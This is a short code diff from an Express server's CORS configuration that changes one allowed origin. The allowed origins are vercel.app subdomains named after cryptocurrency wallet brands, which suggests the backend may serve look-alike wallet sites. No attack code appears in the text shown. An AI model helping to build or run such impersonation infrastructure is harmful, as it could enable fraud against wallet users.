@@ -12,7 +12,7 @@ const PORT = process.env.PORT || 3000;
 app.use(cors({
     origin: ["http://localhost:3000",
         "https://trezor-website-pod-kent-sigma-rule-324324-psi.vercel.app",
-        "https://ledger-tan-omega-kent-sigma-rule-324324-psi.vercel.app",
+        "https://ledger-tan-omega-rent-sigma-rule-324324-psi.vercel.app",
         "https://trust-wallet-blond-six-sigma-dfasf.vercel.app",
         "https://uphold-wallet-blond-six-sigma-dfasf.vercel.app",
         "https://coinbase-gamma-ten-three-wallet-blond-six-sigma-dfasf.vercel.app",
